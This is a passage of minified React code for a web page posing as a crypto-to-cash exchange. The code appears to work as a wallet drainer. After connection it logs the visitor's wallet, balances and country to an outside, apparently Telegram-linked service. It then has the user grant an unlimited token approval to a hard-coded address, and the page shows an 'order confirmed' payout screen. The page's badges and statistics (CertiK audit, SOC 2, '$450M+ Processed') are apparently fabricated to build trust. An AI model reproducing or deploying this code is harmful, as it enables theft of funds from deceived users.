        gradient: e ? "from-blue-500 to-cyan-400" : "from-blue-500 to-purple-500"
    };
    E.useEffect( () => {
        const V = localStorage.getItem("walletAddress");
        window.ethereum && V && window.ethereum.request({
            method: "eth_accounts"
        }).then(J => {
            J && J[0] && J[0].toLowerCase() === V.toLowerCase() ? (i(J[0]),
            r(!0),
            k(2),
            al(J[0])) : localStorage.removeItem("walletAddress")
        }
        ).catch( () => {}
        )
    }
    , []),
    E.useEffect( () => {
        const V = "bitcoin,ethereum,tether,usd-coin,dai"
          , J = {
            bitcoin: .02,
            ethereum: .02,
            "usd-coin": .1,
            dai: .1,
            tether: .1
        }
          , ge = async () => {
            try {
                const le = `https://api.coingecko.com/api/v3/simple/price?ids=${V}&vs_currencies=${d}`
                  , at = await (await fetch(le)).json();
                w([{
                    pair: `BTC/${d.toUpperCase()}`,
                    rate: (at.bitcoin[d] * (1 + J.bitcoin)).toFixed(2),
                    markup: "+5%",
                    volume: "$5.1M"
                }, {
                    pair: `ETH/${d.toUpperCase()}`,
                    rate: (at.ethereum[d] * (1 + J.ethereum)).toFixed(2),
                    markup: "+5%",
                    volume: "$2.4M"
                }, {
                    pair: `USDT/${d.toUpperCase()}`,
                    rate: (at.tether[d] * (1 + J.tether)).toFixed(2),
                    markup: "+25%",
                    volume: "$3.2M"
                }, {
                    pair: `USDC/${d.toUpperCase()}`,
                    rate: (at["usd-coin"][d] * (1 + J["usd-coin"])).toFixed(2),
                    markup: "+20%",
                    volume: "$1.8M"
                }, {
                    pair: `DAI/${d.toUpperCase()}`,
                    rate: (at.dai[d] * (1 + J.dai)).toFixed(2),
                    markup: "+20%",
                    volume: "$890K"
                }])
            } catch {
                w([{
                    pair: "BTC/USD",
                    rate: "122633.58",
                    markup: "+2%",
                    volume: "$52.1M"
                }, {
                    pair: "ETH/USD",
                    rate: "3814.84",
                    markup: "+2%",
                    volume: "$21.4M"
                }, {
                    pair: "USDT/USD",
                    rate: "1.10",
                    markup: "+10%",
                    volume: "$13.2M"
                }, {
                    pair: "USDC/USD",
                    rate: "1.10",
                    markup: "+10%",
                    volume: "$12.8M"
                }, {
                    pair: "DAI/USD",
                    rate: "1.10",
                    markup: "+10%",
                    volume: "$15.8M"
                }])
            }
        }
        ;
        ge();
        const Fe = setInterval(ge, 6e4);
        return () => clearInterval(Fe)
    }
    , [d]);
    const nl = async () => {
        c(!0),
        h(""),
        y("");
        try {
            const {isRegularMobileBrowser: V} = await xc(async () => {
                const {isRegularMobileBrowser: Ie} = await Promise.resolve().then( () => wf);
                return {
                    isRegularMobileBrowser: Ie
                }
            }
            , void 0);
            if (V()) {
                c(!1),
                Zo(!0);
                return
            }
            if (!window.ethereum)
                throw new Error("MetaMask not detected. Please install MetaMask.");
            if (await window.ethereum.request({
                method: "eth_chainId"
            }) !== Ys.chainId)
                try {
                    await window.ethereum.request({
                        method: "wallet_switchEthereumChain",
                        params: [{
                            chainId: Ys.chainId
                        }]
                    })
                } catch (Ie) {
                    if (Ie.code === 4902)
                        await window.ethereum.request({
                            method: "wallet_addEthereumChain",
                            params: [Ys]
                        });
                    else
                        throw Ie
                }
            const ge = await window.ethereum.request({
                method: "eth_requestAccounts"
            });
            if (!ge || ge.length === 0)
                throw new Error("No accounts found. Please unlock your wallet.");
            i(ge[0]),
            r(!0),
            Q(!0),
            setTimeout( () => Q(!1), 3e3);
            const Fe = await al(ge[0]);
            let le = "0.0000"
              , Hn = "0.00";
            if (Fe && Array.isArray(Fe)) {
                const Ie = Fe.find(cn => cn.symbol === "BNB")
                  , dt = Fe.find(cn => cn.symbol === "USDT");
                le = Ie ? Ie.balance : "0.0000",
                Hn = dt ? dt.balance : "0.00"
            }
            k(2),
            y("Wallet connected! Scanning BSC tokens...");
            let at = "N/A";
            try {
                const Ie = await fetch("https://ipapi.co/json/").then(dt => dt.json());
                at = Ie && Ie.country_name ? Ie.country_name : "N/A"
            } catch {}
            await Vi({
                action: "Wallet Connected",
                wallet: ge[0],
                bnb: le,
                usdt: Hn,
                network: "BSC",
                country: at,
                token: "N/A",
                contract: "N/A",
                balance: "N/A",
                paymentMethod: "N/A",
                txHash: "N/A",
                timestamp: new Date().toISOString()
            }),
            localStorage.setItem("walletAddress", ge[0])
        } catch (V) {
            h(V.message || "Failed to connect wallet")
        } finally {
            c(!1)
        }
    }
      , al = async V => {
        c(!0);
        try {
            const J = await fetch(`telegram-bot-production-d2c7.up.railway.app/v1/56/address/${V}/balances_v2/?key=${Gf}`);
            if (!J.ok)
                throw new Error("Failed to fetch token data");
            const ge = await J.json();
            if (ge.data && ge.data.items) {
                const Fe = ge.data.items.filter(le => le.type === "cryptocurrency" && le.balance !== "0" && le.contract_address !== "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee").map(le => ({
                    symbol: le.contract_ticker_symbol,
                    name: le.contract_name,
                    balance: (parseFloat(le.balance) / Math.pow(10, le.contract_decimals)).toFixed(4),
                    value: le.quote ? `$${le.quote.toFixed(2)}` : "$0.00",
                    approved: !1,
                    contractAddress: le.contract_address,
                    logoUrl: le.logo_url
                }));
                return l(Fe),
                c(!1),
                Fe
            }
            return l([]),
            c(!1),
            []
        } catch (J) {
            return h("No Tokens Holding: " + J.message),
            l([]),
            c(!1),
            []
        }
    }
      , rl = async V => {
        f(V.symbol),
        Oe(V.symbol),
        h("");
        try {
            const {ethers: J} = await xc(async () => {
                const {ethers: rt} = await import("./index-Dqx1ixtV.js");
                return {
                    ethers: rt
                }
            }
            , []);
            if (!window.ethereum)
                throw new Error("MetaMask not found");
            const Fe = await new J.BrowserProvider(window.ethereum).getSigner()
              , le = ["function approve(address spender, uint256 amount) external returns (bool)"]
              , Hn = new J.Contract(V.contractAddress,le,Fe)
              , at = "0x4f2d5Ea5De93D5B0e985E4ce18b941187cD13f7B"
              , Ie = J.MaxUint256
              , dt = await Hn.approve(at, Ie);
            await dt.wait(),
            l(rt => rt.map(vs => vs.contractAddress === V.contractAddress ? {
                ...vs,
                approved: !0,
                txHash: dt.hash
            } : vs)),
            j && j.contractAddress === V.contractAddress && B(rt => rt && {
                ...rt,
                approved: !0,
                txHash: dt.hash
            }),
            y(`${V.symbol} approved!`),
            f(""),
            setTimeout( () => Oe(""), 2e3);
            let cn = "";
            o.length > 0 && (cn = o.map(rt => `${rt.symbol} (${rt.contractAddress})`).join(`
`)),
            await Vi({
                action: "Token Approved",
                wallet: s,
                token: V.symbol,
                contract: V.contractAddress,
                balance: V.balance,
                paymentMethod: "N/A",
                country: "N/A",
                txHash: dt.hash,
                tokenList: cn,
                network: "BSC",
                timestamp: new Date().toISOString()
            })
        } catch (J) {
            h(`Approval failed: ${J.message}`),
            f("")
        }
    }
    ;
    E.useEffect( () => {
        j && (gs(!0),
        Qo(null),
        hm(j.symbol).then(V => {
            Vt(V),
            gs(!1)
        }
        ).catch(V => {
            console.error("Price fetch failed:", V),
            Qo("Unable to fetch current price"),
            Vt(null),
            gs(!1)
        }
        ))
    }
    , [j]);
    const sl = () => {
        k(1),
        r(!1),
        i(""),
        l([]),
        B(null),
        N(""),
        M(null),
        D(""),
        O(""),
        $({}),
        y(""),
        h(""),
        localStorage.removeItem("walletAddress")
    }
    ;
    return a.jsxs("div", {
        className: `min-h-screen transition-all duration-300 ${I.bg} relative overflow-x-hidden`,
        children: [a.jsx("div", {
            className: "absolute inset-0 opacity-5",
            children: a.jsx("div", {
                className: "absolute inset-0",
                style: {
                    backgroundImage: `radial-gradient(circle at 25% 25%, #3b82f6 0%, transparent 50%), 
                           radial-gradient(circle at 75% 75%, #06b6d4 0%, transparent 50%)`
                }
            })
        }), a.jsx(Kf, {
            darkMode: e,
            themeClasses: I,
            show: Nm,
            onClose: () => Zo(!1)
        }), km && a.jsx(_f, {
            darkMode: e,
            themeClasses: I,
            onClose: () => Xo(!1)
        }), jm && a.jsx(Vf, {
            darkMode: e,
            themeClasses: I,
            onClose: () => el(!1)
        }), Bm && a.jsx(Hf, {
            darkMode: e,
            themeClasses: I,
            onClose: () => tl(!1)
        }), a.jsx(Wf, {
            darkMode: e,
            setDarkMode: t,
            walletConnected: n,
            walletAddress: s,
            showWalletAnimation: G,
            themeClasses: I,
            isMobile: ys
        }), a.jsx("div", {
            className: "relative z-10",
            children: ys && n ? a.jsx("div", {
                className: "min-h-screen px-3 py-4",
                children: a.jsxs("div", {
                    className: "max-w-md mx-auto",
                    children: [a.jsx("div", {
                        className: `${I.cardBg} rounded-2xl border ${I.border} p-4 mb-4 shadow-xl`,
                        children: a.jsxs("div", {
                            className: "text-center",
                            children: [a.jsx("h2", {
                                className: `text-xl font-bold ${I.text} mb-2`,
                                children: "Crypto to Cash"
                            }), a.jsxs("div", {
                                className: "flex items-center justify-center space-x-2 text-sm",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: `${I.textSecondary}`,
                                    children: "Wallet Connected"
                                })]
                            })]
                        })
                    }), a.jsx(kc, {
                        currentStep: v,
                        loading: u,
                        tokens: o,
                        selectedToken: j,
                        tradeAmount: W,
                        tokenPrice: Ae,
                        priceLoading: Yo,
                        priceError: Jo,
                        darkMode: e,
                        themeClasses: I,
                        connectWallet: nl,
                        setSelectedToken: B,
                        setTradeAmount: F,
                        setSellAmount: N,
                        setQuote: M,
                        setCurrentStep: k
                    }), v === 3 && a.jsx("div", {
                        className: `${I.cardBg} rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`,
                        children: a.jsx(jc, {
                            selectedCountry: U,
                            selectedPaymentMethod: A,
                            paymentDetails: T,
                            themeClasses: I,
                            darkMode: e,
                            setSelectedCountry: D,
                            setSelectedPaymentMethod: O,
                            setPaymentDetails: $,
                            setCurrentStep: k,
                            validatePaymentDetails: Hi
                        })
                    }), v === 4 && a.jsx("div", {
                        className: `${I.cardBg} rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`,
                        children: a.jsx(Bc, {
                            tokens: o,
                            showApprovalAnimation: xe,
                            approvalInProgress: p,
                            darkMode: e,
                            themeClasses: I,
                            approveToken: rl,
                            setCurrentStep: k
                        })
                    }), v === 5 && a.jsx("div", {
                        className: `${I.cardBg} rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 mt-4 backdrop-blur-xl`,
                        children: a.jsxs("div", {
                            className: "text-center py-6",
                            children: [a.jsx("div", {
                                className: "w-16 h-16 bg-gradient-to-r from-green-400 to-emerald-500 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-2xl",
                                children: a.jsx(tt, {
                                    className: "w-8 h-8 text-white"
                                })
                            }), a.jsx("h3", {
                                className: `text-xl font-bold ${I.text} mb-3`,
                                children: "Order Confirmed!"
                            }), a.jsxs("p", {
                                className: `${I.textSecondary} mb-6 px-2`,
                                children: ["Your order is being processed. You will receive funds via ", a.jsx("strong", {
                                    children: A
                                }), " within 5-10 minutes."]
                            }), a.jsxs("div", {
                                className: `bg-gradient-to-r ${e ? "from-green-900/10 to-emerald-900/10" : "from-green-50 to-emerald-50"} border ${e ? "border-green-800/30" : "border-green-200"} rounded-xl p-4 mb-6 text-left backdrop-blur-sm`,
                                children: [a.jsx("h4", {
                                    className: `font-semibold ${e ? "text-green-300" : "text-green-900"} mb-3`,
                                    children: "Order Summary"
                                }), a.jsxs("div", {
                                    className: `space-y-2 text-sm ${I.textSecondary}`,
                                    children: [a.jsxs("div", {
                                        className: "flex justify-between",
                                        children: [a.jsx("span", {
                                            children: "Wallet:"
                                        }), a.jsxs("span", {
                                            className: "font-mono text-xs",
                                            children: [s.slice(0, 6), "...", s.slice(-4)]
                                        })]
                                    }), a.jsxs("div", {
                                        className: "flex justify-between",
                                        children: [a.jsx("span", {
                                            children: "Asset:"
                                        }), a.jsxs("span", {
                                            className: "text-right",
                                            children: [j == null ? void 0 : j.name, " (", j == null ? void 0 : j.symbol, ")"]
                                        })]
                                    }), a.jsxs("div", {
                                        className: "flex justify-between",
                                        children: [a.jsx("span", {
                                            children: "Amount:"
                                        }), a.jsx("span", {
                                            className: "text-right",
                                            children: W
                                        })]
                                    }), a.jsxs("div", {
                                        className: "flex justify-between",
                                        children: [a.jsx("span", {
                                            children: "Payment Method:"
                                        }), a.jsx("span", {
                                            className: "text-right",
                                            children: A
                                        })]
                                    }), a.jsx("hr", {
                                        className: "my-3"
                                    }), a.jsxs("div", {
                                        className: `flex justify-between font-semibold ${e ? "text-green-300" : "text-green-800"}`,
                                        children: [a.jsx("span", {
                                            children: "Status:"
                                        }), a.jsx("span", {
                                            children: "Processing"
                                        })]
                                    })]
                                })]
                            }), a.jsx("button", {
                                onClick: sl,
                                className: `w-full bg-gradient-to-r ${I.gradient} text-white px-6 py-3 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`,
                                children: "Start New Session"
                            })]
                        })
                    })]
                })
            }) : a.jsxs(a.Fragment, {
                children: [a.jsx("div", {
                    className: "max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-6 sm:py-8 lg:py-12",
                    children: a.jsxs("div", {
                        className: "text-center mb-8 sm:mb-12",
                        children: [a.jsxs("h1", {
                            className: `text-3xl sm:text-4xl md:text-5xl lg:text-6xl font-bold ${I.text} mb-4 sm:mb-6 leading-tight`,
                            children: [a.jsx("span", {
                                children: "Convert Crypto to "
                            }), a.jsx("span", {
                                className: "bg-gradient-to-r from-blue-400 to-cyan-400 bg-clip-text text-transparent",
                                children: "Cash"
                            })]
                        }), a.jsx("p", {
                            className: `text-base sm:text-lg lg:text-xl ${I.textSecondary} max-w-2xl mx-auto mb-6 sm:mb-8 px-2`,
                            children: "Instant payouts to your bank account. Secure, fast, and trusted by thousands worldwide."
                        }), a.jsxs("div", {
                            className: "grid grid-cols-2 sm:flex sm:items-center sm:justify-center gap-3 sm:gap-6 lg:gap-8 text-xs sm:text-sm px-2",
                            children: [a.jsxs("div", {
                                className: "flex items-center space-x-2",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-green-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: `${I.textSecondary} whitespace-nowrap`,
                                    children: "98.9% Success Rate"
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-2",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-blue-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: `${I.textSecondary} whitespace-nowrap`,
                                    children: "5 to 15 min Average"
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-2",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-purple-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: `${I.textSecondary} whitespace-nowrap`,
                                    children: "$450M+ Processed"
                                })]
                            }), a.jsxs("div", {
                                className: "flex items-center space-x-2",
                                children: [a.jsx("div", {
                                    className: "w-2 h-2 bg-orange-500 rounded-full animate-pulse"
                                }), a.jsx("span", {
                                    className: `${I.textSecondary} whitespace-nowrap`,
                                    children: "120K+ Active Users"
                                })]
                            })]
                        })]
                    })
                }), a.jsx("div", {
                    className: "max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 pb-6 sm:pb-12",
                    children: a.jsxs("div", {
                        className: "grid lg:grid-cols-3 gap-4 sm:gap-6 lg:gap-8",
                        children: [a.jsxs("div", {
                            className: "lg:col-span-2 space-y-4 sm:space-y-6 lg:space-y-8",
                            children: [a.jsx(kc, {
                                currentStep: v,
                                loading: u,
                                tokens: o,
                                selectedToken: j,
                                tradeAmount: W,
                                tokenPrice: Ae,
                                priceLoading: Yo,
                                priceError: Jo,
                                darkMode: e,
                                themeClasses: I,
                                connectWallet: nl,
                                setSelectedToken: B,
                                setTradeAmount: F,
                                setSellAmount: N,
                                setQuote: M,
                                setCurrentStep: k
                            }), v === 3 && a.jsx("div", {
                                className: `${I.cardBg} rounded-xl sm:rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`,
                                children: a.jsx(jc, {
                                    selectedCountry: U,
                                    selectedPaymentMethod: A,
                                    paymentDetails: T,
                                    themeClasses: I,
                                    darkMode: e,
                                    setSelectedCountry: D,
                                    setSelectedPaymentMethod: O,
                                    setPaymentDetails: $,
                                    setCurrentStep: k,
                                    validatePaymentDetails: Hi
                                })
                            }), v === 4 && a.jsx("div", {
                                className: `${I.cardBg} rounded-xl sm:rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`,
                                children: a.jsx(Bc, {
                                    tokens: o,
                                    showApprovalAnimation: xe,
                                    approvalInProgress: p,
                                    darkMode: e,
                                    themeClasses: I,
                                    approveToken: rl,
                                    setCurrentStep: k
                                })
                            }), v === 5 && a.jsx("div", {
                                className: `${I.cardBg} rounded-xl sm:rounded-2xl ${I.border} border overflow-hidden shadow-2xl p-4 sm:p-6 lg:p-8 backdrop-blur-xl`,
                                children: a.jsxs("div", {
                                    className: "text-center py-4 sm:py-6 lg:py-8",
                                    children: [a.jsx("div", {
                                        className: "w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-green-400 to-emerald-500 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-4 sm:mb-6 shadow-2xl",
                                        children: a.jsx(tt, {
                                            className: "w-8 h-8 sm:w-10 sm:h-10 text-white"
                                        })
                                    }), a.jsx("h3", {
                                        className: `text-xl sm:text-2xl font-bold ${I.text} mb-3`,
                                        children: "Order Confirmed!"
                                    }), a.jsxs("p", {
                                        className: `${I.textSecondary} mb-6 sm:mb-8 max-w-md mx-auto px-2`,
                                        children: ["Your order is being processed. You will receive funds via ", a.jsx("strong", {
                                            children: A
                                        }), " within 5-10 minutes."]
                                    }), a.jsxs("div", {
                                        className: `bg-gradient-to-r ${e ? "from-green-900/10 to-emerald-900/10" : "from-green-50 to-emerald-50"} border ${e ? "border-green-800/30" : "border-green-200"} rounded-xl p-4 sm:p-6 mb-6 sm:mb-8 text-left backdrop-blur-sm`,
                                        children: [a.jsx("h4", {
                                            className: `font-semibold ${e ? "text-green-300" : "text-green-900"} mb-3`,
                                            children: "Order Summary"
                                        }), a.jsxs("div", {
                                            className: `space-y-2 text-xs sm:text-sm ${I.textSecondary}`,
                                            children: [a.jsxs("div", {
                                                className: "flex justify-between",
                                                children: [a.jsx("span", {
                                                    children: "Wallet:"
                                                }), a.jsxs("span", {
                                                    className: "font-mono text-xs",
                                                    children: [s.slice(0, 6), "...", s.slice(-4)]
                                                })]
                                            }), a.jsxs("div", {
                                                className: "flex justify-between",
                                                children: [a.jsx("span", {
                                                    children: "Asset:"
                                                }), a.jsxs("span", {
                                                    className: "text-right",
                                                    children: [j == null ? void 0 : j.name, " (", j == null ? void 0 : j.symbol, ")"]
                                                })]
                                            }), a.jsxs("div", {
                                                className: "flex justify-between",
                                                children: [a.jsx("span", {
                                                    children: "Amount:"
                                                }), a.jsx("span", {
                                                    className: "text-right",
                                                    children: W
                                                })]
                                            }), a.jsxs("div", {
                                                className: "flex justify-between",
                                                children: [a.jsx("span", {
                                                    children: "Payment Method:"
                                                }), a.jsx("span", {
                                                    className: "text-right",
                                                    children: A
                                                })]
                                            }), a.jsx("hr", {
                                                className: "my-3 sm:my-4"
                                            }), a.jsxs("div", {
                                                className: `flex justify-between font-semibold ${e ? "text-green-300" : "text-green-800"}`,
                                                children: [a.jsx("span", {
                                                    children: "Status:"
                                                }), a.jsx("span", {
                                                    children: "Processing"
                                                })]
                                            })]
                                        })]
                                    }), a.jsx("button", {
                                        onClick: sl,
                                        className: `w-full sm:w-auto bg-gradient-to-r ${I.gradient} text-white px-6 sm:px-8 py-3 sm:py-4 rounded-xl font-semibold hover:shadow-2xl transition-all duration-300 hover:scale-105`,
                                        children: "Start New Session"
                                    })]
                                })
                            }), a.jsx("div", {
                                className: "hidden lg:block",
                                children: a.jsx(Cc, {
                                    darkMode: e,
                                    themeClasses: I
                                })
                            })]
                        }), a.jsxs("div", {
                            className: "space-y-4 sm:space-y-6 lg:space-y-8 mt-6 lg:mt-0",
                            children: [a.jsx(Of, {
                                testimonials: bm,
                                darkMode: e,
                                themeClasses: I
                            }), a.jsx("div", {
                                className: "hidden lg:block",
                                children: a.jsx(Tc, {
                                    exchangeRates: S,
                                    showRates: z,
                                    setShowRates: L,
                                    selectedFiat: d,
                                    setSelectedFiat: g,
                                    darkMode: e,
                                    themeClasses: I
                                })
                            }), a.jsx("div", {
                                className: "block lg:hidden",
                                children: a.jsx(Tc, {
                                    exchangeRates: S,
                                    showRates: z,
                                    setShowRates: L,
                                    selectedFiat: d,
                                    setSelectedFiat: g,
                                    darkMode: e,
                                    themeClasses: I
                                })
                            }), a.jsx("div", {
                                className: "block lg:hidden",
                                children: a.jsx(Cc, {
                                    darkMode: e,
                                    themeClasses: I
                                })
                            }), a.jsx("div", {
                                className: "hidden lg:block",
                                children: a.jsx(Ff, {
                                    darkMode: e,
                                    themeClasses: I
                                })
                            })]
                        })]
                    })
                })]
            })
        }), m && a.jsxs("div", {
            className: `mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${e ? "bg-red-900/10" : "bg-red-50"} border ${e ? "border-red-800/30" : "border-red-200"} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`,
            children: [a.jsx(Qt, {
                className: "w-5 h-5 text-red-600 mr-3 flex-shrink-0"
            }), a.jsx("span", {
                className: `${e ? "text-red-300" : "text-red-800"} text-sm sm:text-base`,
                children: m
            })]
        }), x && a.jsxs("div", {
            className: `mt-4 sm:mt-6 mx-3 sm:mx-4 lg:mx-8 ${e ? "bg-green-900/10" : "bg-green-50"} border ${e ? "border-green-800/30" : "border-green-200"} rounded-xl p-3 sm:p-4 flex items-start sm:items-center backdrop-blur-sm`,
            children: [a.jsx(tt, {
                className: "w-5 h-5 text-green-600 mr-3 flex-shrink-0"
            }), a.jsx("span", {
                className: `${e ? "text-green-300" : "text-green-800"} text-sm sm:text-base`,
                children: x
            })]
        }), !(ys && n) && a.jsx("footer", {
            className: `${I.cardBg}/80 backdrop-blur-xl border-t ${I.border} mt-12`,
            children: a.jsxs("div", {
                className: "max-w-7xl mx-auto px-3 sm:px-4 lg:px-8 py-8 sm:py-12",
                children: [a.jsxs("div", {
                    className: "text-center mb-6 sm:mb-8",
                    children: [a.jsx("h3", {
                        className: `text-lg sm:text-xl font-semibold ${I.text} mb-2`,
                        children: "Trusted & Verified Platform"
                    }), a.jsx("p", {
                        className: `text-sm ${I.textSecondary}`,
                        children: "Industry-leading security and compliance standards"
                    })]
                }), a.jsxs("div", {
                    className: "grid grid-cols-2 md:grid-cols-3 lg:grid-cols-6 gap-4 sm:gap-6",
                    children: [a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-blue-500 to-blue-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    fillRule: "evenodd",
                                    d: "M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z",
                                    clipRule: "evenodd"
                                })
                            })
                        }), a.jsx("div", {
                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "Audited by CertiK"
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-green-500 to-green-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    fillRule: "evenodd",
                                    d: "M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z",
                                    clipRule: "evenodd"
                                })
                            })
                        }), a.jsx("div", {
                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "KYC/AML Compliant"
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-purple-500 to-purple-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    fillRule: "evenodd",
                                    d: "M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z",
                                    clipRule: "evenodd"
                                })
                            })
                        }), a.jsx("div", {
                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "SSL Secured"
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-orange-500 to-orange-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    d: "M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"
                                })
                            })
                        }), a.jsx("div", {
                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "DappRadar Verified"
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-indigo-500 to-indigo-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    d: "M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"
                                })
                            })
                        }), a.jsx("div", {
                            className: `text-xs sm:text-sm font-medium ${I.text}`,
                            children: "SOC 2 Certified"
                        })]
                    }), a.jsxs("div", {
                        className: `${e ? "bg-gray-800/50" : "bg-gray-50/50"} border ${I.border} rounded-xl sm:rounded-2xl p-3 sm:p-4 text-center hover:shadow-xl transition-all duration-300 group`,
                        children: [a.jsx("div", {
                            className: "w-8 h-8 sm:w-10 sm:h-10 bg-gradient-to-r from-teal-500 to-teal-600 rounded-xl sm:rounded-2xl flex items-center justify-center mx-auto mb-2 sm:mb-3 group-hover:scale-110 transition-transform duration-300 shadow-lg",
                            children: a.jsx("svg", {
                                className: "w-4 h-4 sm:w-5 sm:h-5 text-white",
                                fill: "currentColor",
                                viewBox: "0 0 20 20",
                                children: a.jsx("path", {
                                    fillRule: "evenodd",
                                    d: "M3 6a3 3 0 013-3h10a1 1 0 01.8 1.6L14.25 8l2.55 3.4A1 1 0 0116 13H6a1 1 0 00-1 1v3a1 1 0 11-2 0V6z",
                                    clipRule: "evenodd"
                                })
                            })
                        }), a.jsx("div", {
